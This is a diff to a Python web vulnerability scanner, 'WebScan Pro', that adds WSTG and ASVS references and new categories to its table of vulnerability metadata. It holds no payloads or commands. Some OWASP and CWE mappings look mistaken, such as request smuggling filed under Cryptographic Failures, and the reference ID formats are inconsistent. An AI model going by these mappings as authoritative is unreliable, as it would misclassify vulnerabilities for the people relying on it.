@@ -27,7 +27,7 @@ except ImportError:
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-VERSION    = "11.5"
+VERSION    = "11.7"
 TOOL_NAME  = "WebScan Pro"
 UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
 TIMEOUT    = 7
@@ -199,124 +199,145 @@ SEV_SCORE = {"Critical":10,"High":7,"Medium":4,"Low":2,"Info":0}
 # ─── OWASP / CWE / CVSS / Business-Impact reference per category ──
 CAT_META = {
     "sqli":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-89","cvss":9.8,
-        "biz":"An attacker can read, modify, or delete your ENTIRE database including user accounts, passwords, and payment records. This is the most dangerous web vulnerability."},
+        "biz": "An attacker can read, modify, or delete your ENTIRE database including user accounts, passwords, and payment records. This is the most dangerous web vulnerability.","wstg": "WSTG-INPV-05","asvs": "ASVS-5.3.4"},
     "xss":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-79","cvss":6.1,
-        "biz":"An attacker can hijack user sessions, steal login cookies, redirect users to phishing pages, and perform actions on behalf of logged-in users."},
+        "biz": "An attacker can hijack user sessions, steal login cookies, redirect users to phishing pages, and perform actions on behalf of logged-in users.","wstg": "WSTG-CLNT-01","asvs": "ASVS-5.3.3"},
     "lfi":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-22","cvss":8.1,
-        "biz":"An attacker can read sensitive server files: /etc/passwd, SSH private keys, database credentials in config files, and application source code."},
+        "biz": "An attacker can read sensitive server files: /etc/passwd, SSH private keys, database credentials in config files, and application source code.","wstg": "WSTG-ATHZ-01","asvs": "ASVS-5.3.12"},
     "ssrf":{"owasp":"A10:2021","owasp_name":"Server-Side Request Forgery","cwe":"CWE-918","cvss":8.8,
-        "biz":"An attacker can use your server to scan internal networks, steal AWS/GCP cloud credentials via metadata API, and reach internal services not meant to be public."},
+        "biz": "An attacker can use your server to scan internal networks, steal AWS/GCP cloud credentials via metadata API, and reach internal services not meant to be public.","wstg": "WSTG-INPV-19","asvs": "ASVS-5.3.17"},
     "xxe":{"owasp":"A04:2021","owasp_name":"Insecure Design","cwe":"CWE-611","cvss":7.5,
-        "biz":"An attacker can read sensitive files from the server or cause denial of service through XML entity expansion (Billion Laughs attack)."},
+        "biz": "An attacker can read sensitive files from the server or cause denial of service through XML entity expansion (Billion Laughs attack).","wstg": "WSTG-INPV-07","asvs": "ASVS-5.5.2"},
     "cors":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-942","cvss":6.5,
-        "biz":"Malicious websites can make authenticated API requests on behalf of your logged-in users and steal their sensitive data or perform actions without consent."},
+        "biz": "Malicious websites can make authenticated API requests on behalf of your logged-in users and steal their sensitive data or perform actions without consent.","wstg": "WSTG-CLNT-07","asvs": "ASVS-14.5.3"},
     "csrf":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-352","cvss":6.5,
-        "biz":"An attacker can trick logged-in users into changing passwords, making purchases, transferring funds, or deleting account data without the user knowing."},
+        "biz": "An attacker can trick logged-in users into changing passwords, making purchases, transferring funds, or deleting account data without the user knowing.","wstg": "WSTG-SESS-05","asvs": "ASVS-4.2.2"},
     "redirect":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-601","cvss":5.4,
-        "biz":"Users can be redirected from your trusted domain to malicious phishing sites, damaging brand trust and enabling credential theft at scale."},
+        "biz": "Users can be redirected from your trusted domain to malicious phishing sites, damaging brand trust and enabling credential theft at scale.","wstg": "WSTG-CLNT-04","asvs": "ASVS-5.1.5"},
     "headers":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-693","cvss":5.3,
-        "biz":"Missing security headers allow browser-based attacks like clickjacking, MIME-type confusion, and XSS to succeed even if application code is otherwise secure."},
+        "biz": "Missing security headers allow browser-based attacks like clickjacking, MIME-type confusion, and XSS to succeed even if application code is otherwise secure.","wstg": "WSTG-CONF-07","asvs": "ASVS-14.4.1"},
     "cookies":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-614","cvss":5.9,
-        "biz":"Session cookies without proper security flags can be stolen via network interception or malicious JavaScript injection, leading to account takeover."},
+        "biz": "Session cookies without proper security flags can be stolen via network interception or malicious JavaScript injection, leading to account takeover.","wstg": "WSTG-SESS-02","asvs": "ASVS-3.4.1"},
     "ssl":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-295","cvss":5.9,
-        "biz":"Without valid HTTPS, all traffic between users and the server is unencrypted. Attackers on the same network can read passwords, payment data, and private messages."},
+        "biz": "Without valid HTTPS, all traffic between users and the server is unencrypted. Attackers on the same network can read passwords, payment data, and private messages.","wstg": "WSTG-CRYP-01","asvs": "ASVS-9.1.1"},
     "sensitive":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-538","cvss":7.5,
-        "biz":"Exposed backup or configuration files can reveal database credentials, API keys, and application source code to any visitor — no technical skill required."},
+        "biz": "Exposed backup or configuration files can reveal database credentials, API keys, and application source code to any visitor — no technical skill required.","wstg": "WSTG-CONF-10","asvs": "ASVS-8.3.4"},
     "methods":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-650","cvss":5.3,
-        "biz":"Dangerous HTTP methods like PUT and DELETE allow attackers to upload malicious files or delete web content without any authentication."},
+        "biz": "Dangerous HTTP methods like PUT and DELETE allow attackers to upload malicious files or delete web content without any authentication.","wstg": "WSTG-CONF-06","asvs": "ASVS-14.5.1"},
     "privesc":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-284","cvss":8.1,
-        "biz":"Exposed admin interfaces, debug panels, or API schemas allow attackers to escalate privileges, access sensitive data, or take full control of the application."},
+        "biz": "Exposed admin interfaces, debug panels, or API schemas allow attackers to escalate privileges, access sensitive data, or take full control of the application.","wstg": "WSTG-ATHZ-01","asvs": "ASVS-4.1.1"},
     "ports":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":5.3,
-        "biz":"Each exposed network service increases the attack surface. Services like MongoDB, Redis, and Elasticsearch are especially dangerous when accessible from the internet."},
+        "biz": "Each exposed network service increases the attack surface. Services like MongoDB, Redis, and Elasticsearch are especially dangerous when accessible from the internet.","wstg": "WSTG-INFO-07","asvs": "ASVS-14.2.3"},
     "dirs":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-548","cvss":5.3,
-        "biz":"Hidden admin directories or backup folders may expose sensitive functionality, archived files with credentials, or legacy code with known vulnerabilities."},
+        "biz": "Hidden admin directories or backup folders may expose sensitive functionality, archived files with credentials, or legacy code with known vulnerabilities.","wstg": "WSTG-CONF-04","asvs": "ASVS-8.3.4"},
     "waf":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":0.0,
-        "biz":"WAF configuration directly impacts the feasibility of automated attacks against your application."},
+        "biz": "WAF configuration directly impacts the feasibility of automated attacks against your application.","wstg": "WSTG-CONF-07","asvs": "ASVS-14.4.1"},
     "subdomains":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-200","cvss":0.0,
-        "biz":"Each subdomain may host outdated applications or services with weaker security controls than the main domain."},
+        "biz": "Each subdomain may host outdated applications or services with weaker security controls than the main domain.","wstg": "WSTG-INFO-04","asvs": "ASVS-14.2.3"},
     "tech":{"owasp":"A06:2021","owasp_name":"Vulnerable and Outdated Components","cwe":"CWE-200","cvss":0.0,
-        "biz":"Identified technologies reveal version information that attackers use to find specific publicly known exploits (CVEs) targeting your exact stack."},
+        "biz": "Identified technologies reveal version information that attackers use to find specific publicly known exploits (CVEs) targeting your exact stack.","wstg": "WSTG-INFO-02","asvs": "ASVS-14.2.1"},
     "ssti":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-94","cvss":9.8,
-        "biz":"Server-side code execution via template injection gives attackers FULL control of the server — read files, execute OS commands, pivot to internal networks, and install backdoors."},
+        "biz": "Server-side code execution via template injection gives attackers FULL control of the server — read files, execute OS commands, pivot to internal networks, and install backdoors.","wstg": "WSTG-INPV-18","asvs": "ASVS-5.3.17"},
     "cmdi":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-78","cvss":10.0,
-        "biz":"An attacker can execute arbitrary operating system commands with the web server's privileges — reading /etc/passwd, stealing files, creating backdoors, and taking full server control."},
+        "biz": "An attacker can execute arbitrary operating system commands with the web server's privileges — reading /etc/passwd, stealing files, creating backdoors, and taking full server control.","wstg": "WSTG-INPV-12","asvs": "ASVS-5.3.8"},
     "jwt":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-347","cvss":8.1,
-        "biz":"Weak or misconfigured JWT tokens allow attackers to forge authentication tokens, escalate to admin, and access any user's account without knowing their password."},
+        "biz": "Weak or misconfigured JWT tokens allow attackers to forge authentication tokens, escalate to admin, and access any user's account without knowing their password.","wstg": "WSTG-SESS-10","asvs": "ASVS-3.5.3"},
     "ratelimit":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-307","cvss":7.5,
-        "biz":"Without rate limiting, attackers can run automated brute-force attacks trying thousands of password combinations per minute until a valid login is found."},
+        "biz": "Without rate limiting, attackers can run automated brute-force attacks trying thousands of password combinations per minute until a valid login is found.","wstg": "WSTG-ATHN-03","asvs": "ASVS-2.2.1"},
     "authn_bypass":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-287","cvss":9.8,
-        "biz":"Authentication bypass gives an attacker full access to the application without valid credentials — accessing admin panels, user data, and all restricted functionality."},
+        "biz": "Authentication bypass gives an attacker full access to the application without valid credentials — accessing admin panels, user data, and all restricted functionality.","wstg": "WSTG-ATHN-01","asvs": "ASVS-2.1.1"},
     "graphql":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":5.3,
-        "biz":"Exposed GraphQL introspection and unbounded queries allow attackers to map the entire API schema, discover hidden endpoints, and amplify brute-force attacks through batch queries."},
+        "biz": "Exposed GraphQL introspection and unbounded queries allow attackers to map the entire API schema, discover hidden endpoints, and amplify brute-force attacks through batch queries.","wstg": "WSTG-INPV-11","asvs": "ASVS-13.1.1"},
     "post_inject":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-89","cvss":9.0,
-        "biz":"POST body parameters are equally vulnerable to injection as GET params. Attackers can submit malicious payloads via forms, API calls, and JSON bodies to trigger SQL injection, XSS, or command injection."},
+        "biz": "POST body parameters are equally vulnerable to injection as GET params. Attackers can submit malicious payloads via forms, API calls, and JSON bodies to trigger SQL injection, XSS, or command injection.","wstg": "WSTG-INPV-05","asvs": "ASVS-5.3.4"},
     "stored_xss":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-79","cvss":8.0,
-        "biz":"Stored XSS persists in the database and executes in every user's browser who views the page — no interaction needed from the attacker. This enables mass session hijacking, defacement, and malware distribution."},
+        "biz": "Stored XSS persists in the database and executes in every user's browser who views the page — no interaction needed from the attacker. This enables mass session hijacking, defacement, and malware distribution.","wstg": "WSTG-INPV-02","asvs": "ASVS-5.3.3"},
     "hostheader":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-20","cvss":6.1,
-        "biz":"Host header injection can poison password reset emails (sending them to attacker-controlled domains), poison server-side caches, or bypass virtual host-based authentication."},
+        "biz": "Host header injection can poison password reset emails (sending them to attacker-controlled domains), poison server-side caches, or bypass virtual host-based authentication.","wstg": "WSTG-INPV-17","asvs": "ASVS-5.3.2"},
     "crlf":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-93","cvss":6.1,
-        "biz":"CRLF injection allows an attacker to inject arbitrary HTTP headers or split HTTP responses — enabling cookie injection, XSS via crafted response headers, and cache poisoning."},
+        "biz": "CRLF injection allows an attacker to inject arbitrary HTTP headers or split HTTP responses — enabling cookie injection, XSS via crafted response headers, and cache poisoning.","wstg": "WSTG-INPV-15","asvs": "ASVS-5.3.2"},
     "idor":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-639","cvss":8.1,
-        "biz":"IDOR allows attackers to access any user's data by simply changing an ID number in a URL — exposing all user accounts, orders, messages, and sensitive records without any authentication bypass."},
+        "biz": "IDOR allows attackers to access any user's data by simply changing an ID number in a URL — exposing all user accounts, orders, messages, and sensitive records without any authentication bypass.","wstg": "WSTG-ATHZ-04","asvs": "ASVS-4.2.1"},
     "subdomain_takeover":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-116","cvss":8.1,
-        "biz":"Subdomain takeover allows an attacker to serve content from your trusted domain — enabling highly credible phishing attacks, session cookie theft (if cookies scope to the domain), and brand damage."},
+        "biz": "Subdomain takeover allows an attacker to serve content from your trusted domain — enabling highly credible phishing attacks, session cookie theft (if cookies scope to the domain), and brand damage.","wstg": "WSTG-CONF-10","asvs": "ASVS-14.2.3"},
     "dns_axfr":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":7.5,
-        "biz":"DNS zone transfer exposes your complete internal infrastructure map — all hostnames, IP addresses, and service locations — dramatically reducing attacker reconnaissance time."},
+        "biz": "DNS zone transfer exposes your complete internal infrastructure map — all hostnames, IP addresses, and service locations — dramatically reducing attacker reconnaissance time.","wstg": "WSTG-INFO-06","asvs": "ASVS-14.2.3"},
     "smuggling":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-444","cvss":8.1,
-        "biz":"HTTP request smuggling allows attackers to inject requests that appear to come from other users, bypass security controls, hijack sessions, and perform actions as other users on shared infrastructure."},
+        "biz": "HTTP request smuggling allows attackers to inject requests that appear to come from other users, bypass security controls, hijack sessions, and perform actions as other users on shared infrastructure.","wstg": "WSTG-INPV-13","asvs": "ASVS-14.5.1"},
     # Phase 2b — v10.0
     "oauth2":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-287","cvss":8.8,
-        "biz":"OAuth 2.0 misconfiguration allows attackers to steal authorization codes, perform CSRF attacks against the OAuth flow, or redirect tokens to attacker-controlled endpoints."},
+        "biz": "OAuth 2.0 misconfiguration allows attackers to steal authorization codes, perform CSRF attacks against the OAuth flow, or redirect tokens to attacker-controlled endpoints.","wstg": "WSTG-ATHN-06","asvs": "ASVS-2.5.5"},
     "hpp":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-235","cvss":6.5,
-        "biz":"HTTP Parameter Pollution can bypass WAF rules, inject malicious values into duplicate parameters, and exploit server inconsistency in parameter parsing to perform injection attacks."},
+        "biz": "HTTP Parameter Pollution can bypass WAF rules, inject malicious values into duplicate parameters, and exploit server inconsistency in parameter parsing to perform injection attacks.","wstg": "WSTG-INPV-04","asvs": "ASVS-5.1.1"},
     "cache_poison":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-345","cvss":8.1,
-        "biz":"Web cache poisoning allows attackers to serve malicious content to all users who receive the poisoned cached response — enabling mass XSS, redirects, and credential theft at CDN scale."},
+        "biz": "Web cache poisoning allows attackers to serve malicious content to all users who receive the poisoned cached response — enabling mass XSS, redirects, and credential theft at CDN scale.","wstg": "WSTG-CONF-07","asvs": "ASVS-14.5.2"},
     "proto_poll":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-1321","cvss":8.1,
-        "biz":"Prototype pollution enables attackers to inject properties into JavaScript Object prototypes — leading to property overwriting, denial of service, and potentially remote code execution in Node.js."},
+        "biz": "Prototype pollution enables attackers to inject properties into JavaScript Object prototypes — leading to property overwriting, denial of service, and potentially remote code execution in Node.js.","wstg": "WSTG-CLNT-10","asvs": "ASVS-5.3.17"},
     "deserial":{"owasp":"A08:2021","owasp_name":"Software and Data Integrity Failures","cwe":"CWE-502","cvss":9.8,
-        "biz":"Insecure deserialization allows attackers to craft malicious serialized objects that execute arbitrary code when deserialized — often achieving remote code execution with server-level privileges."},
+        "biz": "Insecure deserialization allows attackers to craft malicious serialized objects that execute arbitrary code when deserialized — often achieving remote code execution with server-level privileges.","wstg": "WSTG-INPV-11","asvs": "ASVS-5.5.3"},
     "api_sec":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-284","cvss":8.8,
-        "biz":"API mass assignment and BOLA (Broken Object Level Authorization) allow attackers to escalate privileges by assigning admin roles, access any object by ID, and modify other users' data."},
+        "biz": "API mass assignment and BOLA (Broken Object Level Authorization) allow attackers to escalate privileges by assigning admin roles, access any object by ID, and modify other users' data.","wstg": "WSTG-ATHZ-01","asvs": "ASVS-4.2.1"},
     "biz_logic":{"owasp":"A04:2021","owasp_name":"Insecure Design","cwe":"CWE-840","cvss":7.5,
-        "biz":"Business logic flaws allow attackers to manipulate prices, bypass purchase flows, exploit negative quantities, and perform actions the application logic was not designed to allow."},
+        "biz": "Business logic flaws allow attackers to manipulate prices, bypass purchase flows, exploit negative quantities, and perform actions the application logic was not designed to allow.","wstg": "WSTG-BUSL-01","asvs": "ASVS-15.1.1"},
     # Phase 2c — v11.0
     "websocket":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-345","cvss":7.5,
-        "biz":"WebSocket security flaws allow attackers to hijack authenticated WebSocket sessions via Cross-Site WebSocket Hijacking (CSWSH) or access unencrypted ws:// connections for data interception."},
+        "biz": "WebSocket security flaws allow attackers to hijack authenticated WebSocket sessions via Cross-Site WebSocket Hijacking (CSWSH) or access unencrypted ws:// connections for data interception.","wstg": "WSTG-CLNT-10","asvs": "ASVS-13.5.1"},
     "saml":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-287","cvss":9.1,
-        "biz":"SAML misconfiguration allows attackers to bypass authentication entirely via XML signature wrapping or XXE injection in SAML assertions — gaining admin access without valid credentials."},
+        "biz": "SAML misconfiguration allows attackers to bypass authentication entirely via XML signature wrapping or XXE injection in SAML assertions — gaining admin access without valid credentials.","wstg": "WSTG-ATHN-06","asvs": "ASVS-2.5.5"},
     "otp_bypass":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-307","cvss":8.8,
-        "biz":"2FA/OTP bypass vulnerabilities allow attackers to brute-force 6-digit OTP codes, reuse previously valid codes, or manipulate response values — completely defeating two-factor authentication."},
+        "biz": "2FA/OTP bypass vulnerabilities allow attackers to brute-force 6-digit OTP codes, reuse previously valid codes, or manipulate response values — completely defeating two-factor authentication.","wstg": "WSTG-ATHN-06","asvs": "ASVS-2.8.1"},
     "path_norm":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-22","cvss":7.5,
-        "biz":"Path normalization bypass allows attackers to access admin-only or blocked endpoints by using URL encoding, double slashes, or Unicode to confuse the security layer."},
+        "biz": "Path normalization bypass allows attackers to access admin-only or blocked endpoints by using URL encoding, double slashes, or Unicode to confuse the security layer.","wstg": "WSTG-ATHZ-01","asvs": "ASVS-5.3.12"},
     "email_inject":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-93","cvss":6.5,
-        "biz":"Email header injection allows attackers to add CC/BCC recipients to your contact forms — using your mail server as a spam relay and potentially impersonating your domain."},
+        "biz": "Email header injection allows attackers to add CC/BCC recipients to your contact forms — using your mail server as a spam relay and potentially impersonating your domain.","wstg": "WSTG-INPV-10","asvs": "ASVS-5.3.2"},
     "dep_confusion":{"owasp":"A06:2021","owasp_name":"Vulnerable and Outdated Components","cwe":"CWE-427","cvss":7.5,
-        "biz":"Dependency confusion allows attackers to publish malicious packages with the same name as your internal packages — which may be automatically installed instead of your private ones during CI/CD builds."},
+        "biz": "Dependency confusion allows attackers to publish malicious packages with the same name as your internal packages — which may be automatically installed instead of your private ones during CI/CD builds.","wstg": "WSTG-CONF-10","asvs": "ASVS-14.2.1"},
     "dom_xss":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-79","cvss":7.5,
-        "biz":"DOM-based XSS occurs entirely in the browser — the payload never touches the server. Attackers use URL fragments, postMessage, or other browser APIs to inject malicious scripts that steal sessions and data."},
+        "biz": "DOM-based XSS occurs entirely in the browser — the payload never touches the server. Attackers use URL fragments, postMessage, or other browser APIs to inject malicious scripts that steal sessions and data.","wstg": "WSTG-CLNT-01","asvs": "ASVS-5.3.3"},
     "ip_info":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":0.0,
-        "biz":"IP and geolocation information reveals hosting infrastructure details useful in targeted attacks."},
+        "biz": "IP and geolocation information reveals hosting infrastructure details useful in targeted attacks.","wstg": "WSTG-INFO-07","asvs": "ASVS-14.2.3"},
     # Phase 1 OSINT — v11.3
     "osint_email":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":5.3,
-        "biz":"Exposed email addresses enable targeted phishing, credential stuffing, and social engineering attacks against staff and administrators."},
+        "biz": "Exposed email addresses enable targeted phishing, credential stuffing, and social engineering attacks against staff and administrators.","wstg": "WSTG-INFO-01","asvs": "ASVS-8.3.4"},
     "osint_dns":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":7.5,
-        "biz":"Missing DMARC/SPF/DKIM records allow attackers to send spoofed emails from your domain — enabling highly credible phishing campaigns that bypass spam filters."},
+        "biz": "Missing DMARC/SPF/DKIM records allow attackers to send spoofed emails from your domain — enabling highly credible phishing campaigns that bypass spam filters.","wstg": "WSTG-INFO-06","asvs": "ASVS-9.1.4"},
     "osint_dorks":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":0.0,
-        "biz":"Google dorks reveal files, login panels, error pages, and sensitive paths indexed by search engines and accessible to any attacker without authentication."},
+        "biz": "Google dorks reveal files, login panels, error pages, and sensitive paths indexed by search engines and accessible to any attacker without authentication.","wstg": "WSTG-INFO-01","asvs": "ASVS-8.3.4"},
     "osint_breach":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-359","cvss":8.1,
-        "biz":"Previously breached credentials may still be in active use. Attackers use breach databases to perform credential stuffing against your login endpoints."},
+        "biz": "Previously breached credentials may still be in active use. Attackers use breach databases to perform credential stuffing against your login endpoints.","wstg": "WSTG-ATHN-07","asvs": "ASVS-2.1.5"},
     "osint_github":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-312","cvss":9.0,
-        "biz":"Hardcoded API keys, passwords, and tokens in public repositories give attackers direct access to cloud infrastructure, databases, and third-party services without any hacking required."},
+        "biz": "Hardcoded API keys, passwords, and tokens in public repositories give attackers direct access to cloud infrastructure, databases, and third-party services without any hacking required.","wstg": "WSTG-CONF-10","asvs": "ASVS-14.2.1"},
     "osint_js":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-312","cvss":7.5,
-        "biz":"JavaScript files often contain hardcoded API keys, internal endpoint URLs, and authentication tokens that are visible to anyone who views your page source."},
+        "biz": "JavaScript files often contain hardcoded API keys, internal endpoint URLs, and authentication tokens that are visible to anyone who views your page source.","wstg": "WSTG-INFO-05","asvs": "ASVS-8.3.4"},
     "default_creds":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-521","cvss":9.8,
-        "biz":"Default or weak credentials on admin panels give attackers immediate full access to the application, server, and database without any exploitation required."},
+        "biz": "Default or weak credentials on admin panels give attackers immediate full access to the application, server, and database without any exploitation required.","wstg": "WSTG-ATHN-07","asvs": "ASVS-2.1.5"},
     "srv_hardening":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":7.5,
-        "biz":"Exposed server internals, CGI vulnerabilities, WebDAV, and backup files allow attackers to enumerate technology stack, upload files, or execute remote commands."},
+        "biz": "Exposed server internals, CGI vulnerabilities, WebDAV, and backup files allow attackers to enumerate technology stack, upload files, or execute remote commands.","wstg": "WSTG-CONF-02","asvs": "ASVS-14.2.2"},
     "info_disclosure":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":5.3,
-        "biz":"Internal IP addresses, stack traces, debug output, and sensitive comments in HTML reduce attacker effort significantly by revealing internal architecture and credentials."},
+        "biz": "Internal IP addresses, stack traces, debug output, and sensitive comments in HTML reduce attacker effort significantly by revealing internal architecture and credentials.","wstg": "WSTG-INFO-05","asvs": "ASVS-8.3.4"},
     "zap_passive":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":4.3,
-        "biz":"Insecure form actions, missing cache headers, autocomplete on passwords, and mixed content create attack surfaces for credential theft, cache poisoning, and downgrade attacks."},
+        "biz": "Insecure form actions, missing cache headers, autocomplete on passwords, and mixed content create attack surfaces for credential theft, cache poisoning, and downgrade attacks.","wstg": "WSTG-CONF-07","asvs": "ASVS-14.4.1"},
+    "cloud_bucket":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-312","cvss":7.5,"wstg":"WSTG-CONF-10","asvs":"V14.4","biz":"Cloud storage misconfiguration exposing sensitive files or allowing public write access"},
+"mass_assignment":{"owasp":"A08:2021","owasp_name":"Software and Data Integrity Failures","cwe":"CWE-915","cvss":7.5,"wstg":"WSTG-BUSL-08","asvs":"V13.3","biz":"Mass assignment allows attackers to set unauthorized model attributes"},
+"acct_takeover":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-284","cvss":9.1,"wstg":"WSTG-ATHN-06","asvs":"V2.9","biz":"Account takeover exposes user data and enables impersonation or fraud"},
+"redos":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-1333","cvss":5.3,"wstg":"WSTG-BUSL-09","asvs":"V12.3","biz":"ReDoS causes denial of service via catastrophic regex backtracking"},
+"clickjacking":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-1021","cvss":4.3,"wstg":"WSTG-CLNT-09","asvs":"V14.4","biz":"Clickjacking tricks users into unintended actions via hidden iframe overlays"},
+"jsonp_inject":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-345","cvss":6.5,"wstg":"WSTG-CLNT-11","asvs":"V13.2","biz":"JSONP injection enables cross-origin data theft without CORS restrictions"},
+"css_inject":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-74","cvss":5.4,"wstg":"WSTG-CLNT-05","asvs":"V5.3","biz":"CSS injection enables data exfiltration or UI manipulation via style attributes"},
+"http2_vulns":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-770","cvss":7.5,"wstg":"WSTG-CONF-12","asvs":"V14.1","biz":"HTTP/2 vulnerabilities enable header injection, DoS or request smuggling attacks"},
+"cve_scan":{"owasp":"A06:2021","owasp_name":"Vulnerable and Outdated Components","cwe":"CWE-1035","cvss":7.5,"wstg":"WSTG-INFO-02","asvs":"V14.2","biz":"Known CVE vulnerabilities in server software may be exploitable without patching"},
+"s3_brute":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-312","cvss":7.5,"wstg":"WSTG-CONF-10","asvs":"V14.4","biz":"Public S3 buckets may expose sensitive data or permit unauthorized file uploads"},
+"wayback_urls":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-200","cvss":5.3,"wstg":"WSTG-INFO-02","asvs":"V14.3","biz":"Historical URLs may reveal deprecated endpoints, debug paths or sensitive data"},
+"param_discover":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-200","cvss":5.3,"wstg":"WSTG-INFO-07","asvs":"V13.1","biz":"Hidden parameters may expose unintended functionality or bypass security controls"},
+"race_condition":{"owasp":"A04:2021","owasp_name":"Insecure Design","cwe":"CWE-362","cvss":8.1,"wstg":"WSTG-BUSL-09","asvs":"V11.1","biz":"Race conditions enable TOCTOU attacks, double-spend or privilege escalation"},
+"nosql_inject":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-943","cvss":9.8,"wstg":"WSTG-INPV-01","asvs":"V5.4","biz":"NoSQL injection enables authentication bypass and unrestricted data access"},
+"sspp":{"owasp":"A08:2021","owasp_name":"Software and Data Integrity Failures","cwe":"CWE-1321","cvss":8.1,"wstg":"WSTG-INPV-11","asvs":"V5.4","biz":"Server-side prototype pollution corrupts shared objects enabling RCE or privilege escalation"},
+"oob_blind":{"owasp":"A10:2021","owasp_name":"Server-Side Request Forgery","cwe":"CWE-918","cvss":7.5,"wstg":"WSTG-INPV-19","asvs":"V10.3","biz":"OOB blind vulnerabilities exfiltrate data via DNS or HTTP out-of-band channels"},
+"file_upload":{"owasp":"A04:2021","owasp_name":"Insecure Design","cwe":"CWE-434","cvss":9.8,"wstg":"WSTG-BUSL-08","asvs":"V12.2","biz":"Unrestricted file upload enables webshell deployment and remote code execution"},
+"postmessage":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-345","cvss":6.5,"wstg":"WSTG-CLNT-10","asvs":"V13.2","biz":"PostMessage without origin validation enables cross-origin data theft or UI redress"},
+"acct_enum":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-204","cvss":5.3,"wstg":"WSTG-IDNT-04","asvs":"V2.9","biz":"Account enumeration aids targeted attacks by revealing valid usernames via response differences"},
+"login_brute":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-307","cvss":9.8,
+        "biz": "Weak or default credentials on login forms allow attackers to gain unauthorized access through automated brute-force, credential stuffing, or password spray attacks — bypassing authentication entirely.","wstg": "WSTG-ATHN-03","asvs": "ASVS-2.2.1"},
 }
 
 CAT_TITLES = {
@@ -394,6 +415,13 @@ CAT_TITLES = {
     "wayback_urls":    ("🕰️",  "Wayback / Archive URLs"),
